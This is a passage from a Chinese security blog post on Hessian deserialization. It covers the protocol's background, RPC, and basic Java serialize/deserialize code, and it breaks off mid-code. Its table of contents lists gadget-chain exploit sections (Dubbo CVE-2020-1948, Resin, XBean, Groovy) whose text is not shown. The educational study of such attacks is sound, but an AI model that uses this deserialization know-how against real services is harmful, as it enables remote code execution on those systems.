<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="简介 Hessian 是 caucho 公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。 这是一种动态类型的二进制序列化和 Web 服务协议，专为面向对象的传">
<meta property="og:type" content="article">
<meta property="og:title" content="Hessian反序列化">
<meta property="og:url" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="简介 Hessian 是 caucho 公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。 这是一种动态类型的二进制序列化和 Web 服务协议，专为面向对象的传">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163231453.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163340658.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163753010.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163815867.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164125221.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164344199.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164401216.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164449298.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231165052187.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231165519755.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170108193.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170353815.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170503061.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170540480.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250101165327865.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104160754479.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161327316.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161631606.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104161733694.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162119159.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162237509.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104162313983.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104170343863.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104164259843.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104165104584.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104165946484.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104170020823.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183559048.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183742050.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104183818375.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104184419709.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104191416009.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104191446748.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193248159.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193329595.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193522153.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193914317.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104194048298.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104194501959.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104195944414.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104204344810.png">
<meta property="article:published_time" content="2025-01-01T08:25:28.000Z">
<meta property="article:modified_time" content="2025-03-05T07:24:36.791Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="Hessian">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163231453.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Hessian反序列化</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/01/03/%E9%97%B2%E8%B0%88/%E5%9B%BE%E4%B9%A6%E9%A6%86%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Hessian反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Hessian反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hessian反序列化&body=Check out this article: https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Hessian反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Hessian反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Hessian反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RPC%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">RPC协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">简单使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">Hessian反序列化漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Dubbo-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1948%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resin%E9%93%BE"><span class="toc-number">6.</span> <span class="toc-text">Resin链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XBean%E9%93%BE"><span class="toc-number">7.</span> <span class="toc-text">XBean链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="toc-number">7.1.</span> <span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy%E9%93%BE"><span class="toc-number">8.</span> <span class="toc-text">Groovy链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-3"><span class="toc-number">8.1.</span> <span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl-SignedObject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.</span> <span class="toc-text">TemplatesImpl+SignedObject二次反序列化</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Hessian反序列化
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-01T08:25:28.000Z" class="dt-published" itemprop="datePublished">2025-01-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Hessian/" rel="tag">Hessian</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="简介">简介</h2>
<p>Hessian 是 <a target="_blank" rel="noopener" href="https://caucho.com/">caucho</a> 公司的工程项目，为了达到或超过 ORMI/Java JNI 等其他跨语言/平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。</p>
<p>这是一种动态类型的<a target="_blank" rel="noopener" href="http://hessian.caucho.com/doc/hessian-serialization.html">二进制序列化</a>和 <a target="_blank" rel="noopener" href="http://hessian.caucho.com/doc/hessian-ws.html">Web 服务</a>协议，专为面向对象的传输而设计。Hessian 协议在设计时，重点的几个目标包括了：必须尽可能的快、必须尽可能紧凑、跨语言、不需要外部模式或接口定义等等。</p>
<p>对于这样的设计，caucho 公司其实提供了两种解决方案，一个是 Hession，一个是 Burlap。Hession 是基于二进制的实现，传输数据更小更快，而 Burlap 的消息是 XML 的，有更好的可读性。两种数据都是基于 HTTP 协议传输。</p>
<p>Hessian 本身作为 <a target="_blank" rel="noopener" href="https://caucho.com/products/resin">Resin</a> 的一部分，但是它的 <code>com.caucho.hessian.client</code> 和 <code>com.caucho.hessian.server</code> 包不依赖于任何其他的 Resin 类，因此它也可以使用任何容器如 Tomcat 中，也可以使用在 EJB 中。事实上很多通讯框架都使用或支持了这个规范来序列化及反序列化类。</p>
<p>作为一个二进制的序列化协议，Hessian 自行定义了一套自己的储存和还原数据的机制。对 8 种基础数据类型、3 种递归类型、ref 引用以及 Hessian 2.0 中的内部引用映射进行了相关定义。这样的设计使得 Hassian 可以进行跨语言跨平台的调用。</p>
<p>引用自su18师傅的介绍<a target="_blank" rel="noopener" href="https://su18.org/post/hessian/#%E4%BA%8C-%E4%BB%8B%E7%BB%8D">https://su18.org/post/hessian/#%E4%BA%8C-%E4%BB%8B%E7%BB%8D</a></p>
<h2 id="RPC协议">RPC协议</h2>
<p>RPC全称为Remote Procedure Call Protocol（远程调用协议），RPC和之前学的RMI十分类似，都是远程调用服务，它们不同之处就是RPC是通过标准的二进制格式来定义请求的信息，这样跨平台和系统就更加方便<br>
RPC协议的一次远程通信过程如下</p>
<ul>
<li>客户端发起请求，并按照RPC协议格式填充信息</li>
<li>填充完毕后将二进制格式文件转化为流，通过传输协议进行传输</li>
<li>服务端接收到流后，将其转换为二进制格式文件，并按照RPC协议格式获取请求的信息并进行处理</li>
<li>处理完毕后将结果按照RPC协议格式写入二进制格式文件中并返回<br>
引用自boogipop师傅的博客：<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#RPC%E5%8D%8F%E8%AE%AE">https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#RPC%E5%8D%8F%E8%AE%AE</a></li>
</ul>
<h2 id="简单使用">简单使用</h2>
<p>环境依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>新建一个Person类并实现序列化接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新建一个Hessian序列化和反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_stu</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);  </span><br><span class="line">        output.writeObject(o);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  